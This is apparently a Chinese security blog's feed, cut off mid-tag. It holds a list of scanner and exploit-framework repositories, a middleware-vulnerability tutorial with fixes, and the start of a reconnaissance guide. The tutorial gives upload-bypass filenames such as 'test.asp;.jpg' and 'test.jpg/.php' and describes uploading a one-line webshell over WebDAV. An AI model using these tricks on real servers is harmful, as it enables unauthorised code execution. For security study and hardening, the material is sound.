class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/wufeifei/cobra</span><br></pre></td></tr></table></figure><p>(静态PHP代码审计)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/OneSourceCat/phpvulhunter</span><br></pre></td></tr></table></figure><p>(跟踪，分析PHP运行情况的工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Qihoo360/phptrace</span><br></pre></td></tr></table></figure><p>(NodeJS应用代码审计)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ajinabraham/NodeJsScan</span><br></pre></td></tr></table></figure><p>(Python应用审计)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shengqi158/pyvulhunter</span><br></pre></td></tr></table></figure><p>(Ruby on Rails应用静态代码分析)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/presidentbeef/brakeman</span><br></pre></td></tr></table></figure><p>(Python应用静态代码审计)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/python-security/pyt</span><br></pre></td></tr></table></figure><p>(WordPress插件代码安全审计)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/m4ll0k/WPSploit</span><br></pre></td></tr></table></figure><p>(用于扫描PHP应用程序中可能存在SQL漏洞的ADOdb代码)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/emanuil/php-reaper</span><br></pre></td></tr></table></figure><p><a href="https://github.com/lowjoel/phortress">https://github.com/lowjoel/phortress</a></p><p>(用于检测潜在安全漏洞的PHP静态代码分析工具)</p><p><a href="https://github.com/az0ne/AZScanner">https://github.com/az0ne/AZScanner</a></p><p>(自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测)</p><p><a href="https://github.com/blackye/lalascan">https://github.com/blackye/lalascan</a> </p><p>(集合owasp top10漏洞扫描和边界资产发现能力的分布式web漏洞扫描框架)</p><p><a href="https://github.com/blackye/BkScanner">https://github.com/blackye/BkScanner</a></p><p>(BkScanner分布式，插件化web漏洞扫描器)</p><p><a href="https://github.com/ysrc/GourdScanV2">https://github.com/ysrc/GourdScanV2</a></p><p>(ysrc出品的被动式漏洞扫描工具)</p><p><a href="https://github.com/netxfly/passive_scan">https://github.com/netxfly/passive_scan</a></p><p>(基于http代理的web漏洞扫描器)</p><p><a href="https://github.com/1N3/Sn1per">https://github.com/1N3/Sn1per</a></p><p>(自动化扫描器，包括中间件扫描以及设备指纹识别)</p><p><a href="https://github.com/RASSec/pentestEr_Fully-automatic-scanner">https://github.com/RASSec/pentestEr_Fully-automatic-scanner</a></p><p>(定向全自动化渗透测试工具)</p><p><a href="https://github.com/3xp10it/3xp10it">https://github.com/3xp10it/3xp10it</a></p><p>(自动化渗透测试框架，支持cdn真实ip查找，指纹识别等)</p><p><a href="https://github.com/Lcys/lcyscan">https://github.com/Lcys/lcyscan</a></p><p>(蟒插件化漏洞扫描器，支持生成扫描报表)</p><p><a href="https://github.com/Xyntax/POC-T">https://github.com/Xyntax/POC-T</a> </p><p>(渗透测试插件化并发框架)</p><p><a href="https://github.com/v3n0m-Scanner/V3n0M-Scanner">https://github.com/v3n0m-Scanner/V3n0M-Scanner</a></p><p>(支持检测SQLI/ XSS / LFI / RFI等漏洞的扫描器)</p><p><a href="https://github.com/Skycrab/leakScan">https://github.com/Skycrab/leakScan</a></p><p>(Web图形化的漏洞扫描框架)</p><p><a href="https://github.com/zhangzhenfeng/AnyScan">https://github.com/zhangzhenfeng/AnyScan</a></p><p>(一款网络化的自动化渗透测试框架)</p><p><a href="https://github.com/Tuhinshubhra/RED_HAWK">https://github.com/Tuhinshubhra/RED_HAWK</a></p><p>(一款集成信息收集，漏洞扫描，指纹识别等的多合一扫描工具)</p><p><a href="https://github.com/Arachni/arachni">https://github.com/Arachni/arachni</a> </p><p>(高度集成化的Web应用漏洞扫描框架，支持REST，RPC等api调用)</p><p><a href="https://github.com/infobyte/faraday">https://github.com/infobyte/faraday</a></p><p>(集成化渗透测试辅助平台及漏洞管理平台)</p><p><a href="https://github.com/juansacco/exploitpack">https://github.com/juansacco/exploitpack</a></p><p>(渗透测试集成框架，包含超过38,000+攻击)</p><p><a href="https://github.com/swisskyrepo/DamnWebScanner">https://github.com/swisskyrepo/DamnWebScanner</a></p><p>(基于铬/歌剧插件的被动式漏洞扫描)</p><p><a href="https://github.com/anilbaranyelken/tulpar">https://github.com/anilbaranyelken/tulpar</a></p><p>(支持多种网络漏洞扫描，命令行环境使用)</p><p><a href="https://github.com/m4ll0k/Spaghetti">https://github.com/m4ll0k/Spaghetti</a></p><p>(web应用扫描器，支持指纹识别，文件目录爆破，SQL / XSS / RFI等漏洞扫描，也可直接用于struts，ShellShock等扫描)</p><p><a href="https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest">https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest</a> </p><p>(集成子域名枚举，nmap，waf指纹识别等模块的web应用扫描器)</p><p><a href="https://github.com/0xsauby/yasuo">https://github.com/0xsauby/yasuo</a> </p><p>(使用ruby开发的扫描网络中主机存在的第三方web应用服务漏洞)</p><p><a href="https://github.com/hatRiot/clusterd">https://github.com/hatRiot/clusterd</a></p><p>(Web应用自动化扫描框架，支持自动化上传webshell)</p><p><a href="https://github.com/erevus-cn/pocscan">https://github.com/erevus-cn/pocscan</a> </p><p>(一款开源Poc调用框架，可轻松调用Pocsuite，Tangscan，Beebeeto，Knowsec老版本POC，可使用docker部署)</p><p><a href="https://github.com/TophantTechnology/osprey">https://github.com/TophantTechnology/osprey</a> </p><p>(斗象能力中心出品并长期维护的开源漏洞检测框架)</p><p><a href="https://github.com/yangbh/Hammer">https://github.com/yangbh/Hammer</a></p><p>(Web应用漏洞扫描框架)</p><p><a href="https://github.com/Lucifer1993/AngelSword">https://github.com/Lucifer1993/AngelSword</a></p><p>(Web应用漏洞扫描框架，基于python3)</p><p><a href="https://github.com/secrary/EllaScanner">https://github.com/secrary/EllaScanner</a></p><p>(被动式漏洞扫描，支持历史cve编号漏洞识别)</p><p><a href="https://github.com/zaproxy/zaproxy">https://github.com/zaproxy/zaproxy</a></p><p>(OWASP ZAP核心项目出品的综合性渗透测试工具)</p><p><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a></p><p>(Web服务综合型扫描器，用于指定目标的资产收集，安全配置缺陷或者安全漏洞扫描)</p><p><a href="https://github.com/s0md3v/Striker">https://github.com/s0md3v/Striker</a></p><p>(一款多方位信息收集，指纹识别及漏洞扫描工具)</p><p><a href="https://github.com/dermotblair/webvulscan">https://github.com/dermotblair/webvulscan</a> </p><p>(一款web应用漏洞扫描器，支持扫描反射型以及存储型xss，sql injection等漏洞，支持输出pdf报告)</p><p><a href="https://github.com/alienwithin/OWASP-mth3l3m3nt-framework">https://github.com/alienwithin/OWASP-mth3l3m3nt-framework</a></p><p>(渗透测试辅助工具，综合利用框架)</p><p>(基于被动式扫描框架的自动化web漏洞扫描工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/toyakula/luna</span><br></pre></td></tr></table></figure><p>(渗透测试辅助框架，包含信息搜集，无线渗透，网络应用扫描等功能)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Manisso/fsociety</span><br></pre></td></tr></table></figure><p>(内置1200+插件的web漏洞扫描框架)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/boy-hack/w9scan</span><br></pre></td></tr></table></figure><p>(Web服务安全评估工具，提供基于windows操作系统的简单.exe应用)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/YalcinYolalan/WSSAT</span><br></pre></td></tr></table></figure><p>(使用去开发的可扩展以及高并发渗透测试框架)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/AmyangXYZ/AssassinGo</span><br></pre></td></tr></table></figure><p>(基于Flask应用框架的漏洞扫描系统)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/jeffzh3ng/InsectsAwake</span><br></pre></td></tr></table></figure><p>(一个操作上类似metasploit的web应用安全审计框架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/m4ll0k/Galileo</span><br></pre></td></tr></table></figure><p>(一款web应用漏洞扫描器，支持扫描反射型以及存储型xss，sql injection等漏洞)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/joker25000/Optiva-Framework</span><br></pre></td></tr></table></figure><p>(集成104个模块的Web应用程序渗透测试框架)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/theInfectedDrake/TIDoS-Framework</span><br></pre></td></tr></table></figure><p>(一款APT入侵痕迹扫描器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Neo23x0/Loki</span><br></pre></td></tr></table></figure><p>(ICS设备nmap扫描脚本)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/w3h/icsmaster/tree/master/nse</span><br></pre></td></tr></table></figure><p>(SDN安全评估框架)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/OpenNetworkingFoundation/DELTA</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h2&gt;&lt;p&gt;今天看到一个博客里有这个置顶的工具清单，但是发现这些都是很早以前就有文章发出来的，我爬下来后一直放在txt里吃土。这里一起放</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Web中间件常见漏洞总结（一）</title>
    <link href="http://example.com/2021/08/15/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2021/08/15/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2021-08-15T12:37:52.000Z</published>
    <updated>2022-12-06T09:19:28.532Z</updated>
    
    <content type="html"><![CDATA[<p>*<strong>本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</strong></p><h2 id="一、-常见web中间件及其漏洞概述"><a href="#一、-常见web中间件及其漏洞概述" class="headerlink" title="一、 常见web中间件及其漏洞概述"></a>一、 常见web中间件及其漏洞概述</h2><h3 id="（一）-IIS"><a href="#（一）-IIS" class="headerlink" title="（一） IIS"></a>（一） IIS</h3><p>1、PUT漏洞</p><p>2、短文件名猜解</p><p>3、远程代码执行</p><p>4、解析漏洞</p><h3 id="（二）-Apache"><a href="#（二）-Apache" class="headerlink" title="（二） Apache"></a>（二） Apache</h3><p>1、解析漏洞</p><p>2、目录遍历</p><h3 id="（三）-Nginx"><a href="#（三）-Nginx" class="headerlink" title="（三） Nginx"></a>（三） Nginx</h3><p>1、文件解析</p><p>2、目录遍历</p><p>3、CRLF注入</p><p>4、目录穿越</p><h3 id="（四）Tomcat"><a href="#（四）Tomcat" class="headerlink" title="（四）Tomcat"></a>（四）Tomcat</h3><p>1、远程代码执行</p><p>2、war后门文件部署</p><h3 id="（五）jBoss"><a href="#（五）jBoss" class="headerlink" title="（五）jBoss"></a>（五）jBoss</h3><p>1、反序列化漏洞</p><p>2、war后门文件部署</p><h3 id="（六）WebLogic"><a href="#（六）WebLogic" class="headerlink" title="（六）WebLogic"></a>（六）WebLogic</h3><p>1、反序列化漏洞</p><p>2、SSRF</p><p>3、任意文件上传</p><p>4、war后门文件部署</p><h3 id="（七）其它中间件相关漏洞"><a href="#（七）其它中间件相关漏洞" class="headerlink" title="（七）其它中间件相关漏洞"></a>（七）其它中间件相关漏洞</h3><p>1、FastCGI未授权访问、任意命令执行</p><p>2、PHPCGI远程代码执行</p><h2 id="二、-IIS漏洞分析"><a href="#二、-IIS漏洞分析" class="headerlink" title="二、 IIS漏洞分析"></a>二、 IIS漏洞分析</h2><h3 id="（一）-IIS简介"><a href="#（一）-IIS简介" class="headerlink" title="（一） IIS简介"></a>（一） IIS简介</h3><p>IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。最初是Windows NT版本的可选包，随后内置在Windows 2000、Windows XP Professional和Windows Server 2003一起发行，但在Windows XP Home版本上并没有IIS。IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p><p>IIS的安全脆弱性曾长时间被业内诟病，一旦IIS出现远程执行漏洞威胁将会非常严重。远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码，可以导致IIS服务器所在机器蓝屏或读取其内存中的机密数据</p><h3 id="（二）-PUT漏洞"><a href="#（二）-PUT漏洞" class="headerlink" title="（二） PUT漏洞"></a>（二） PUT漏洞</h3><p><strong>1、漏洞介绍及成因</strong></p><p>IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。</p><p>版本： IIS6.0</p><p><strong>2、漏洞复现</strong></p><p>1） 开启WebDAV 和写权限</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1544954468_5c162264b3e77.png!small" alt="img"></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1544954489_5c16227975735.png!small" alt="img"></p><p>2） 利用burp测试</p><p>抓包，将GET请求改为OPTIONS</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1544954500_5c162284754a0.png!small" alt="img"></p><p>3）利用工具进行测试</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1544954508_5c16228cd082b.png!small" alt="img"></p><p>成功上传，再上传一句话木马，然后用菜刀连接，getshell</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1544954522_5c16229a1787c.png!small" alt="img"></p><p><strong>3、漏洞修复</strong></p><p>关闭WebDAV 和写权限</p><h3 id="（二）短文件名猜解"><a href="#（二）短文件名猜解" class="headerlink" title="（二）短文件名猜解"></a>（二）短文件名猜解</h3><p><strong>1、漏洞介绍及成因</strong></p><p>IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。</p><p><strong>2、漏洞复现</strong></p><p>1）、在网站根目录下添加aaaaaaaaaa.html文件</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1544954542_5c1622ae9bc64.png!small" alt="img"></p><p>2） 进行猜解</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1544954552_5c1622b8d255e.png!small" alt="img"></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1544954584_5c1622d80a9c8.png!small" alt="img"></p><p><strong>3、漏洞修复</strong></p><p>修复方法：</p><p>1）升级.net framework</p><p>2）修改注册表禁用短文件名功能</p><p>快捷键Win+R打开命令窗口，输入regedit打开注册表窗口，找到路径：</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式，修改完成后，需要重启系统生效</p><p>3）CMD关闭NTFS 8.3文件格式的支持</p><p>4）将web文件夹的内容拷贝到另一个位置，如c:\www到d:\w,然后删除原文件夹，再重命名d:\w到c:\www。</p><p>修复后：</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1544954597_5c1622e59d557.png!small" alt="img"></p><p><strong>4、局限性</strong></p><p>\1) 此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解；</p><p>\2) 如果文件名本身太短（无短文件名）也是无法猜解的；</p><p>\3) 如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配；</p><h3 id="（三）-远程代码执行"><a href="#（三）-远程代码执行" class="headerlink" title="（三） 远程代码执行"></a>（三） 远程代码执行</h3><p><strong>1、 漏洞介绍及成因</strong></p><p>在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。</p><p><strong>2、 漏洞复现</strong></p><p>1）漏洞环境搭建</p><p>在windows server 2003 r2 32位上安装iis6.0</p><p>2） 触发漏洞</p><p>在本地执行exp，exp如下</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1544954632_5c1623084ecaa.png!small" alt="img"></p><p>执行成功后，服务器端弹出计算器：</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1544954644_5c162314621a4.png!small" alt="img"></p><p><strong>3、 漏洞修复</strong></p><p>1）关闭 WebDAV 服务</p><p>2） 使用相关防护设备</p><h3 id="（四）-解析漏洞"><a href="#（四）-解析漏洞" class="headerlink" title="（四） 解析漏洞"></a>（四） 解析漏洞</h3><p><strong>1、 漏洞介绍及成因</strong></p><p>IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。这一漏洞有两种完全不同的利用方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/test.asp/test.jpg</span><br><span class="line"></span><br><span class="line">test.asp;.jpg</span><br></pre></td></tr></table></figure><p><strong>2、漏洞复现</strong></p><p>利用方式 1</p><p>第一种是新建一个名为 “test.asp” 的目录，该目录中的任何文件都被 IIS 当作 asp 程序执行（特殊符号是 “/” ）</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1544954672_5c162330306e1.png!small" alt="img"></p><p>利用方式 2</p><p>第二种是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1544954681_5c162339092fb.png!small" alt="img"></p><p>IIS7.5 文件解析漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.jpg/.php</span><br></pre></td></tr></table></figure><p>URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，而 php 又默认开启 “cgi.fix_pathinfo”, 会对文件进行 “ 修理 ” ，可谓 “ 修理 ” ？举个例子，当 php 遇到路径 “/aaa.xxx/bbb.yyy” 时，若 “/aaa.xxx/bbb.yyy” 不存在，则会去掉最后的 “bbb.yyy” ，然后判断 “/aaa.xxx” 是否存在，若存在，则把 “/aaa.xxx” 当作文件。</p><p>若有文件 test.jpg ，访问时在其后加 /.php ，便可以把 “test.jpg/.php” 交给 php ， php 修理文件路径 “test.jpg/.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。</p><p><strong>3、 漏洞修复</strong></p><p>1）对新建目录文件名进行过滤，不允许新建包含‘.’的文件</p><p>2）曲线网站后台新建目录的功能，不允许新建目录</p><p>3）限制上传的脚本执行权限，不允许执行脚本</p><p>4）过滤.asp/xm.jpg，通过ISApi组件过滤</p><h2 id="三、-Apache漏洞分析"><a href="#三、-Apache漏洞分析" class="headerlink" title="三、 Apache漏洞分析"></a>三、 Apache漏洞分析</h2><h3 id="（一）-Apache简介"><a href="#（一）-Apache简介" class="headerlink" title="（一） Apache简介"></a>（一） Apache简介</h3><p>Apache 是世界使用排名第一的Web 服务器软件。它可以运行在几乎所有广泛使用的 计算机平台上，由于其 跨平台 和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将 Perl/ Python等 解释器编译到服务器中。</p><h3 id="（二）-解析漏洞"><a href="#（二）-解析漏洞" class="headerlink" title="（二） 解析漏洞"></a>（二） 解析漏洞</h3><p><strong>1、 漏洞介绍及成因</strong></p><p>Apache文件解析漏洞与用户的配置有密切关系，严格来说属于用户配置问题。</p><p>Apache文件解析漏洞涉及到一个解析文件的特性：</p><p>Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在mime.tyoes内），则继续向左识别，当我们请求这样一个文件：shell.xxx.yyy</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yyy-&gt;无法识别，向左</span><br><span class="line"></span><br><span class="line">xxx-&gt;无法识别，向左</span><br></pre></td></tr></table></figure><p>php-&gt;发现后缀是php，交给php处理这个文件</p><p><strong>2、 漏洞复现</strong></p><p>上传一个后缀名为360的php文件</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1544954824_5c1623c8ad26c.png!small" alt="img"></p><p><strong>3、 漏洞修复</strong></p><p>将AddHandler application/x-httpd-php .php的配置文件删除。</p><h3 id="（三）-目录遍历"><a href="#（三）-目录遍历" class="headerlink" title="（三） 目录遍历"></a>（三） 目录遍历</h3><p><strong>1、 漏洞介绍及成因</strong></p><p>由于配置错误导致的目录遍历</p><p><strong>2、 漏洞复现</strong></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1544954845_5c1623dd062fa.png!small" alt="img"></p><p><strong>3、 漏洞修复</strong></p><p>修改apache配置文件httpd.conf</p><p>找到Options+Indexes+FollowSymLinks +ExecCGI并修改成 Options-Indexes+FollowSymLinks +ExecCGI 并保存；</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1544954862_5c1623eee9f99.png!small" alt="img"></p><p><img src="https://image.3001.net/images/20181216/1544954862_5c1623eee9f99.png!small" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;*&lt;strong&gt;本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;一、-常见web中间件及其漏洞概述&quot;&gt;&lt;a href=&quot;#一、-常见web中间件及其漏洞概述&quot; c</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="iis" scheme="http://example.com/tags/iis/"/>
    
  </entry>
  
  <entry>
    <title>web渗透详细过程之信息收集篇</title>
    <link href="http://example.com/2021/08/06/web%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/"/>
    <id>http://example.com/2021/08/06/web%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/</id>
    <published>2021-08-06T08:58:11.000Z</published>
    <updated>2022-12-06T09:19:19.253Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web渗透详细过程之信息收集篇"><a href="#Web渗透详细过程之信息收集篇" class="headerlink" title="Web渗透详细过程之信息收集篇"></a>Web渗透详细过程之信息收集篇</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在这大千世界中，总有让你心动的目标。当你偶然遇见一位成熟稳重的帅哥，不用我说那内心的小鹿肯定开始乱撞，冰封已久的冰山开始融化。<br>想要把小哥哥追到手，需要一步步来。首先要进行信息收集，需要知道他的个人信息，例如叫什么，联系方式，喜好，在哪里工作，做什么行业，或者家庭住址等等。</p><h3 id="收集域名信息"><a href="#收集域名信息" class="headerlink" title="收集域名信息"></a>收集域名信息</h3><p>通常我们想知道这个心上人叫什么的时候就要想办法得到他的名片，上边一般都会介绍他的姓名，职业，所在单位，单位地址。</p><p>在这里对目标进行whois查询，查询域名是否被注册、注册商、DNS。就好比看对方的名片一样。以下介绍几种获取对方名片的方法。</p><h4 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h4><p><strong>1、域名whois查询-站长之家</strong></p><p><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1626853646_60f7d10e498a557e151c5.png" alt="img"></p><p><strong>2、IP138网站</strong></p><p><a href="https://site.ip138.com/">https://site.ip138.com/</a></p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1626853723_60f7d15b03c94b51e34c1.png" alt="img"></p><p><strong>3、域名信息查询-腾讯云</strong></p><p><a href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a></p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1626853769_60f7d189ed81ccb6341e3.png" alt="img"></p><p><strong>4、ICANN LOOKUP</strong></p><p><a href="https://lookup.icann.org/">https://lookup.icann.org/</a></p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1626853817_60f7d1b91f719ecacd78c.png" alt="img"></p><h4 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h4><p><strong>1、SEO综合查询</strong></p><p><a href="https://www.aizhan.com/cha/">https://www.aizhan.com/cha/</a></p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1626853870_60f7d1ee6fd6356a5189a.png" alt="img"></p><p><strong>2、ICP备案查询-站长工具</strong></p><p><a href="http://icp.chinaz.com/">http://icp.chinaz.com/</a></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626853961_60f7d24903af22231b68f.png" alt="img"></p><h4 id="IP反查站点"><a href="#IP反查站点" class="headerlink" title="IP反查站点"></a>IP反查站点</h4><p><strong>1、Dnslytics</strong></p><p>利用Dnslytics反查IP可以得到如下信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">IP information</span><br><span class="line">Network information</span><br><span class="line">Hosting information</span><br><span class="line">SPAM database lookup</span><br><span class="line">Open TCP/UDP ports</span><br><span class="line">Blocklist lookup</span><br><span class="line">Whois information</span><br><span class="line">Geo information</span><br><span class="line">Country information</span><br><span class="line">Update information</span><br></pre></td></tr></table></figure><p>利用Dnslytics反查域名可以得到如下信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Domain and Ranking Information</span><br><span class="line">Hosting Information&#123;</span><br><span class="line">A / AAAA Record</span><br><span class="line">NS Record</span><br><span class="line">MX Record</span><br><span class="line">SPF Record</span><br><span class="line">&#125;</span><br><span class="line">Web Information</span><br><span class="line">Whois Information</span><br></pre></td></tr></table></figure><p><a href="https://dnslytics.com/">https://dnslytics.com/</a></p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1626854048_60f7d2a083117d23c32f6.png" alt="img"></p><h4 id="相关应用信息"><a href="#相关应用信息" class="headerlink" title="相关应用信息"></a>相关应用信息</h4><p><strong>1、天眼查</strong></p><p><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p><p><strong>2、七麦数据</strong></p><p><a href="https://www.qimai.cn/">https://www.qimai.cn/</a></p><h3 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h3><p>在一些大的网站都会使用CDN(内容分发网络)，它可以使内容传输的更快、更加稳定。，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。一般CDN隐藏了目标服务器的真实的IP，也提高了安全性。<br>就像你找人家问他的名字，他就告诉你假的名字或外号，这一看对你兴趣不大啊，这时连心上人的真名字都不知道怎嘛进行下一步，那不凉凉了。这里说下如何识别给你的名字是真的还是假的，给假的名字情况下如何获取真实姓名。</p><p><img 